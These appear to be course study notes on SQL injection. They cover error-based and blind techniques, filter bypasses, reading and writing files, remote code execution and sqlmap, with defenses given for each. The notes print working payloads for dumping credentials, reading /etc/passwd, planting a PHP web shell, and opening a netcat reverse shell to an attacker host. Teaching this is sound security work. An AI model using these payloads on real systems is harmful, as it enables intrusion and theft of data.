# SQL Injection Concepts

**What is SQL Injection?**
- SQL injection involves injecting SQL queries into existing queries to manipulate database operations.
- Common in web applications with a backend database.
- User input from the frontend is incorporated into backend SQL queries.
- If input is not properly handled, attackers can execute arbitrary SQL commands.

**Why SQL Injections are a Concern**
- SQL injections compromise the CIA triad:
  - **Confidentiality**: Data can be read.
  - **Integrity**: Data can be modified.
  - **Availability**: Data can be deleted.
- Potential outcomes:
  - Extracting, modifying, or deleting database data.
  - Accessing the target's local file system.
  - Remote Command Execution (RCE).

**Causes of SQL Injections**
- Insecure coding practices.
- Trusting user input without proper validation.
- Lack of secure Software Development Life Cycle (SDLC) practices.

**Types of SQL Injections**
1. **Authentication Bypass**:
   - Example: Bypassing login forms using SQL injection to gain unauthorized access.
2. **Error-Based SQL Injection**:
   - Leveraging database error messages to adjust and refine SQL queries.
3. **Blind SQL Injection**:
   - No direct feedback; relies on indirect clues to determine success.
4. **NoSQL Injection**:
   - Exploiting NoSQL databases (like MongoDB) with similar injection techniques.

**Finding SQL Injection Points**
- **Visible Methods**:
  - Login forms, search boxes, URLs with query parameters (e.g., `id=1`).
- **Less Visible Methods**:
  - Analyzing page source and API calls using tools like web proxies (e.g., Burp Suite).

**Automating SQL Injection Discovery**
- Using vulnerability scanners (e.g., Nessus).
- SQL-specific tools (e.g., SQLMap) for automated testing and exploitation.

**Common Defenses Against SQL Injections**
1. **Input Validation**:
   - Regular expression filtering to block special characters like single quotes.
2. **Web Application Firewalls (WAFs)**:
   - Identifying and blocking SQL injection attempts.
3. **Least Privilege Principle**:
   - Restricting database access rights to minimize potential damage.
4. **Parameterized Queries / Prepared Statements**:
   - Using pre-built SQL statements that do not change based on user input.

**Bypassing SQL Injection Defenses**
1. **Query Obfuscation**:
   - Using inline comments to break up query strings (e.g., `or/**/1=1`).
2. **Null Bytes**:
   - Incorporating null bytes (`%00`) to disrupt pattern matching.
3. **Using Variables**:
   - Embedding SQL queries within variables.
4. **Encoding Special Characters**:
   - URL encoding or hex encoding special characters to bypass filters.
5. **Concatenation**:
   - Breaking keywords into parts using concatenation (e.g., `S+E+L+E+C+T`).
6. **Uncommon Queries**:
   - Using less common but logically equivalent queries (e.g., `dog=dog` instead of `1=1`).

# Error-Based SQL Injection

## Overview
- **Definition:** A type of SQL injection that relies on database error messages to confirm and exploit vulnerabilities.
- **Goal:** Trigger database errors to reveal information about the structure of the database, including columns, tables, and data.

## How it Works
1. Inject a **single quote (`'`)** or similar characters into inputs to provoke errors.
2. Analyze error messages to identify:
   - Valid injection points.
   - Database structure (e.g., number of columns, table names).
3. Use SQL queries (e.g., `ORDER BY`, `UNION SELECT`) to extract data or refine injection techniques.

## Steps in Exploiting Error-Based SQL Injection
1. **Find Injection Points:**
   - Test inputs like search boxes, URLs, or login forms.
   - Example: Adding `'` to a search query may result in an error like:
     ```
     You have an error in your SQL syntax.
     ```

2. **Determine the Number of Columns:**
   - Use `ORDER BY` to incrementally test the number of columns.
   - Example:
     ```
     ' ORDER BY 1--   (Works)
     ' ORDER BY 2--   (Works)
     ' ORDER BY 8--   (Error: 8 columns do not exist)
     ```
   - Stop when an error occurs to identify the maximum column count.

3. **Label Output Columns:**
   - Use `UNION SELECT` to identify output columns visible in the web application.
   - Example:
     ```
     ' UNION SELECT 1,2,3,4-- 
     ```
   - The visible numbers in the result correspond to exploitable columns.

4. **Extract Table and Column Names:**
   - Use `information_schema` tables to gather database metadata.
   - Example:
     ```sql
     ' UNION SELECT table_name FROM information_schema.tables--
     ' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
     ```

5. **Retrieve Sensitive Data:**
   - Extract data using the identified table and column names.
   - Example:
     ```sql
     ' UNION SELECT username, password FROM users--
     ```

6. **Crack Password Hashes (if applicable):**
   - Extract hashed passwords and use tools like [CrackStation](https://crackstation.net) to decode them.

## Defenses Against Error-Based SQL Injection
1. **Input Validation:**
   - Block characters like `'`, `"`, `--`, `;` to prevent SQL injection.
2. **Parameterized Queries (Prepared Statements):**
   - Separate SQL code from user input.
3. **Web Application Firewalls (WAF):**
   - Detect and block suspicious queries.
4. **Least Privilege:**
   - Restrict database user permissions to minimize damage.
5. **Disable Detailed Error Messages:**
   - Return generic error messages to users (e.g., "An error occurred.").


## Blind-Based SQL Injection
**Importance**
Understanding how to handle situations when you can't see immediate feedback from SQL injections.

**Understanding Blind SQL Injection**
- Sometimes, an attack's success is not immediately visible.
- Blind SQL injections are used when there's no direct indication of success or failure.
- Different from error-based injections where you get direct feedback.

**Types of Blind SQL Injection Techniques**
1. **Boolean-Based Blind SQL Injection**
   - Relies on the application returning different results for TRUE and FALSE queries.
   - Example: Checking for the existence of data based on conditional statements (`OR 1=1` for TRUE, `OR 1=2` for FALSE).
   - Observing the response helps determine if the injection was successful.

2. **Time-Based Blind SQL Injection**
   - Involves injecting SQL commands that cause the database to delay its response.
   - Example: Using the `SLEEP` function to introduce a delay.
   - The time delay indicates whether the injection was successful.

## How Blind SQL Injection Works
1. **Boolean-Based Approach:**
   - Inject logical conditions to observe variations in responses.
   - Example process:
     - Inject `' OR 1=1--` (True condition) → Observe if content is displayed.
     - Inject `' OR 1=2--` (False condition) → Observe if content is not displayed.
   - Use conditions like `ORDER BY` to infer database structure:
     ```sql
     ' ORDER BY 1-- (Valid column)
     ' ORDER BY 8-- (Invalid column, triggers subtle behavior changes)
     ```

2. **Time-Based Approach:**
   - Exploit functions like `SLEEP()` to delay responses.
   - Example process:
     - Inject `' OR SLEEP(5)--` → Response delayed by 5 seconds indicates success.
     - Adjust sleep time to validate column counts or other queries.

## Challenges
- **Slower Process:**
  - Requires manual testing and multiple iterations.
  - Each test (e.g., counting columns) involves observing subtle or delayed responses.
- **Subtle Feedback:**
  - Relies on small application behavior changes or response delays.
 
## Defenses Against Blind SQL Injection
1. **Input Validation:**
   - Reject unexpected characters (`'`, `"`, `;`, `--`).
2. **Parameterized Queries (Prepared Statements):**
   - Prevent dynamic query construction.
3. **Web Application Firewalls (WAF):**
   - Detect and block anomalous patterns.
4. **Disable Sleep Commands:**
   - Prevent execution of time-based functions like `SLEEP()`.
5. **Limit Error Feedback:**
   - Return generic error messages.

## Key Takeaways
- Blind SQL injection is slower and more complex but still effective for attackers.
- Automation tools can speed up the exploitation process (e.g., SQLMap).
- Comprehensive defenses and secure coding practices are critical to mitigate this risk.

# SQLi System Access

## Key Takeaways

1. **SQL Injection Basics**  
   - Exploits vulnerabilities in database queries to manipulate data.
   - Commonly used to access or manipulate unauthorized data.

2. **File Read via SQL Injection**  
   - Use the `LOAD_FILE` function to read files accessible to the SQL user.  
   - **Example Command:**
     ```sql
     UNION SELECT 1, 2, 3, LOAD_FILE('/etc/passwd'), 5, 6, 7--
     ```
   - Displays contents of the `/etc/passwd` file.

3. **File Write via SQL Injection**  
   - Use `INTO OUTFILE` to write files, such as text files or scripts, to writable directories.  
   - **Example Command:**
     ```sql
     UNION SELECT 1, 2, 3, 'Test Content!', 5, 6, 7 INTO OUTFILE '/var/www/html/test.txt'--
     ```

4. **Remote Code Execution (RCE)**  
   - Inject PHP code into writable directories to create a web shell.  
   - **Example PHP Shell Command:**
     ```sql
     UNION SELECT 1, 2, 3, "<?php echo shell_exec($_GET['cmd']); ?>", 5, 6, 7 INTO OUTFILE '/var/www/html/shell.php'--
     ```
   - Access the shell via the browser:
     ```
     http://target.com/shell.php?cmd=whoami
     ```

5. **Escalation to Reverse Shell**  
   - Combine RCE with tools like `netcat` to gain interactive shell access.  
   - **Start a listener on the attacker machine:**
     ```bash
     nc -lvp 9999
     ```
   - **Inject Reverse Shell Command:**
     ```sql
     UNION SELECT 1, 2, 3, "<?php echo shell_exec('nc -e /bin/bash <attacker_ip> 9999'); ?>", 5, 6, 7 INTO OUTFILE '/var/www/html/reverse.php'--
     ```
   - **Trigger the reverse shell via browser:**
     ```
     http://target.com/reverse.php
     ```

## Security Implications

- SQL injection is one of the most critical web application vulnerabilities.
- Enables attackers to:
  - Access sensitive files.
  - Execute arbitrary system commands.
  - Compromise entire systems.

### Mitigation Strategies
- Always **validate and sanitize user inputs**.
- Use **parameterized queries** and **Object Relational Mapping (ORM)** practices.
- Limit database permissions to the minimum required for functionality.

# SQLmap

## Key Takeaways

1. **What is SQLmap?**
   - A powerful automation tool for identifying and exploiting SQL injection vulnerabilities.
   - Allows users to enumerate databases, extract data, and even execute system commands if conditions allow.
   - Essential for ethical hackers and frequently referenced in certification exams.

2. **Setting Up SQLmap**
   - Ensure SQLmap is installed (default in Kali Linux).
   - Basic syntax:
     ```bash
     sqlmap --url "http://target.com/vulnerable_page.php"
     ```
   - Use **GET** or **POST** requests:
     - For GET: Pass the URL.
     - For POST: Use `--data` to provide request body.

3. **Common SQLmap Options**
   - `--url`: Define the target URL.
   - `--cookie`: Provide session tokens for authenticated testing.
   - `--data`: Supply POST request parameters.
   - `--dbs`: Enumerate databases.
   - `--tables`: List tables within a database.
   - `--columns`: Display columns in a table.
   - `--dump`: Extract data from specified columns.
   - `--os-shell`: Attempt OS shell access.

4. **Example Commands**
   - Enumerate databases:
     ```bash
     sqlmap --url "http://target.com/vulnerable_page.php" --dbs
     ```
   - Enumerate tables in a specific database:
     ```bash
     sqlmap --url "http://target.com/vulnerable_page.php" -D <database_name> --tables
     ```
   - Dump data from specific columns:
     ```bash
     sqlmap --url "http://target.com/vulnerable_page.php" -D <database_name> -T <table_name> -C "column1,column2" --dump
     ```
   - Attempt OS command execution:
     ```bash
     sqlmap --url "http://target.com/vulnerable_page.php" -D <database_name> --os-shell
     ```

5. **Using Cookies and Session Tokens**
   - If a session is required, pass cookies using `--cookie`:
     ```bash
     sqlmap --url "http://target.com/vulnerable_page.php" --cookie="PHPSESSID=abc123; SecurityLevel=low"
     ```

6. **Important Observations**
   - SQLmap can detect and bypass many defenses, including:
     - URL redirects.
     - Cookies for session management.
     - Union-based and boolean-based SQL injection techniques.
   - Automated cracking of hashed passwords is supported (e.g., dictionary attacks).

## Security Implications
- SQLmap makes it easy to identify vulnerabilities, but its power emphasizes the importance of securing web applications:
  - Always sanitize user input.
  - Implement parameterized queries.
  - Enforce least-privilege access for databases.

## Ethical Usage
This tool is intended for **authorized penetration testing** and **security assessments** only. Misuse can result in legal consequences. Always obtain proper permissions before testing.

For more details, refer to the [SQLmap Documentation](https://sqlmap.org/).
